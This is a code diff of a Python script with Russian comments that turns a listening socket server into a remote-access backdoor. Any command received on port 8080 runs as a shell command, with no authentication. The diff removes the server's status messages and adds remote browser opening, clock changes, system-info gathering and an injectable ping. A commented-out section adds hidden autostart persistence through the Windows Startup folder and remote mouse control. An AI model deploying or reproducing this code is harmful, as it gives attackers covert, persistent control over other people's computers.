@@ -2,27 +2,29 @@ import socket
 import subprocess
 import os
 
-
+import webbrowser
+import platform
+#import psutil
+#from PIL import ImageGrab
+import time
+from datetime import datetime
 # Настройки сервера
 HOST = '0.0.0.0'  # Слушать все адреса
 PORT = 8080       # Порт для подключения
 
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind((HOST, PORT))
-server_socket.listen(1)
-print(f"Сервер запущен. Ожидание подключения на порту {PORT}...")
+server_socket.listen()
 
 conn, addr = server_socket.accept()
-print(f"Подключение от: {addr}")
 
 current_dir = os.getcwd()  # Текущая директория сервера
 
 while True:
     try:
         # Получение команды
-        command = conn.recv(1024).decode("utf-8").strip()
+        command = conn.recv(4096).decode("utf-8").strip()
         if command.lower() == 'exit' or command.startswith("0"):
-            print("Закрытие соединения.")
             break
 
         if command.startswith("create_file") or command.startswith("1"):
@@ -38,8 +40,8 @@ while True:
             # Открыть калькулятор
             if os.name == "nt":  # Windows
                 subprocess.Popen("calc.exe")
-            elif os.name == "posix":  # Linux/Mac
-                subprocess.Popen(["gnome-calculator"])
+            # elif os.name == "posix":  # Linux/Mac
+            #     subprocess.Popen(["gnome-calculator"])
             conn.send("Калькулятор запущен.".encode("utf-8"))
 
         
@@ -76,6 +78,53 @@ while True:
                 conn.send("Ошибка: Файл не найден.".encode("utf-8"))
 
        
+        elif command == "get_system_info" or command.startswith("7"):
+            # Получение характеристик ПК
+            system_info = {
+                "OS": platform.system(),
+                "OS Version": platform.version(),
+                "Processor": platform.processor(),
+            }
+            info = "\n".join([f"{key}: {value}" for key, value in system_info.items()])
+            conn.send(info.encode("utf-8"))
+
+        elif command.startswith("open_website") or command.startswith("8"):
+            # Открытие сайта
+            _, url = command.split(maxsplit=1)
+            try:
+                webbrowser.open(url)
+                conn.send(f"Сайт открыт: {url}".encode("utf-8"))
+            except Exception as e:
+                conn.send(f"Ошибка при открытии сайта: {e}".encode("utf-8"))
+
+
+        elif command.startswith("uptime") or command.startswith("9"):
+            with open("/proc/uptime", "r") as f:
+                uptime_seconds = float(f.readline().split()[0])
+            uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime_seconds))
+            conn.send(f"Время работы системы: {uptime_str}".encode("utf-8"))
+
+        elif command.startswith("change_time") or command.startswith("10"):
+            try:
+                _, new_time = command.split(maxsplit=1)
+                subprocess.run(["date", "-s", new_time], check=True)
+                conn.send(f"Время сервера успешно изменено на {new_time}".encode("utf-8"))
+            except Exception as e:
+                conn.send(f"Ошибка изменения времени: {e}".encode("utf-8"))
+
+        elif command.startswith("ping") or command.startswith("11"):
+            _, address = command.split(maxsplit=1)
+            result = subprocess.getoutput(f"ping -c 4 {address}")
+            conn.send(result.encode("utf-8"))
+
+
+        elif command.startswith("show_message") or command.startswith("12"):
+            _, message = command.split(maxsplit=1)
+            if os.name == "nt":  # Windows
+                subprocess.run(["msg", "*", message], check=True)
+            else:
+                subprocess.run(["notify-send", message], check=True)
+            conn.send(f"Сообщение '{message}' отправлено.".encode("utf-8"))
 
         else:
             # Выполнение произвольной команды
@@ -89,3 +138,97 @@ conn.close()
 server_socket.close()
 
 
+# import socket
+# import subprocess
+# import os
+# import pyautogui  # Для управления мышкой и клавиатурой
+
+
+# import os
+# import shutil
+# import sys
+# import winreg
+
+# def add_to_autostart():
+#     script_path = sys.argv[0]  # Путь к самому скрипту
+
+#     # Создание ярлыка в папке автозагрузки
+#     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+#     shortcut_path = os.path.join(startup_folder, 'server.lnk')
+
+#     if not os.path.exists(shortcut_path):
+#         # Создание ярлыка через Windows API
+#         import pythoncom
+#         from win32com.client import Dispatch
+
+#         shell = Dispatch('WScript.Shell')
+#         shortcut = shell.CreateShortcut(shortcut_path)
+#         shortcut.TargetPath = sys.executable.replace("python.exe", "pythonw.exe")  # Путь к интерпретатору Python
+#         shortcut.Arguments = f'"{script_path}"'  # Путь к вашему скрипту
+#         shortcut.WorkingDirectory = os.path.dirname(script_path)
+#         shortcut.WindowStyle = 7
+#         print("ss")
+#         shortcut.Save()
+#         print(f"Ярлык создан: {shortcut_path}")
+#     else:
+#         print("Скрипт уже находится в автозагрузке.")
+
+# if __name__ == "__main__":
+#     add_to_autostart()
+#     print("Скрипт добавлен в автозагрузку!")
+#     # Основная логика вашего скрипта:
+#     while True:
+
+
+
+#         # Настройки сервера
+#         HOST = '0.0.0.0'  # Слушать все адреса
+#         PORT = 8080       # Порт для подключения
+
+#         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#         server_socket.bind((HOST, PORT))
+#         server_socket.listen(1)
+#         print(f"Сервер запущен. Ожидание подключения на порту {PORT}...")
+
+#         conn, addr = server_socket.accept()
+#         print(f"Подключение от: {addr}")
+
+#         while True:
+#             try:
+#                 # Получение команды
+#                 command = conn.recv(1024).decode().strip()
+#                 if command.lower() == 'exit':
+#                     print("Закрытие соединения.")
+#                     break
+
+#                 if command.startswith("create_file"):
+#                     # Создать файл на рабочем столе
+#                     file_path = os.path.join(os.path.expanduser("~"), "Desktop", "example.txt")
+#                     with open(file_path, "w") as f:
+#                         f.write("Это тестовое содержимое.")
+#                     conn.send(f"Файл создан: {file_path}".encode())
+
+#                 elif command.startswith("open_calculator"):
+#                     # Открыть калькулятор
+#                     if os.name == "nt":  # Windows
+#                         subprocess.Popen("calc.exe")
+#                     elif os.name == "posix":  # Linux/Mac
+#                         subprocess.Popen(["gnome-calculator"])
+#                     conn.send("Калькулятор запущен.".encode())
+
+#                 elif command.startswith("move_mouse"):
+#                     # Переместить мышку
+#                     x, y = map(int, command.split()[1:3])  # Пример: move_mouse 100 200
+#                     pyautogui.moveTo(x, y)
+#                     conn.send(f"Мышка перемещена в координаты: {x}, {y}".encode())
+
+#                 else:
+#                     # Выполнение произвольной команды
+#                     output = subprocess.getoutput(command)
+#                     conn.send(output.encode())
+
+#             except Exception as e:
+#                 conn.send(f"Ошибка: {e}".encode())
+
+#         conn.close()
+#         server_socket.close()
